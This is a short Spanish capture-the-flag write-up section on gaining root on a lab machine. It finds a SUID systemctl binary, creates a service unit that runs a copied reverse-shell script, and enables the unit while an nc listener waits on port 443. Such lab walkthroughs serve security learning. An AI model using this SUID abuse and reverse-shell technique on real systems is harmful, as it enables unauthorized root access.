## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /home/pepper
ls
cd /Web
cd /Logs
cat 10.10.14.7.txt
```

Aqui vemos que nos a loggeado toda la Injeccion SQL.

```bash
id
sudo -l
find \-perm -4000 2>/dev/null
```

Vemos que systemctl es SUID y que tiene proprietario root

```bash
cd 
mkdir privesc
cd privesc
cp /tmp/reverse.sh privesc.sh
```

Aqui nos vamos a crear un systemctl service file -> `nano privesc.service`

```bash
[Unit]
Description=EEEEEEEe

[Service]
ExecStart=/home/pepper/privesc/privesc.sh

[Install]
WantedBy=multi-user.target
```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos un link del servicio

    ```bash
    systemctl link /home/pepper/privesc/privesc.service
    ```

1. Lanzamos el servicio

    ```bash
    systemctl enable --now /home/pepper/privesc/privesc.service
    ```


`whoami` -> root ;)
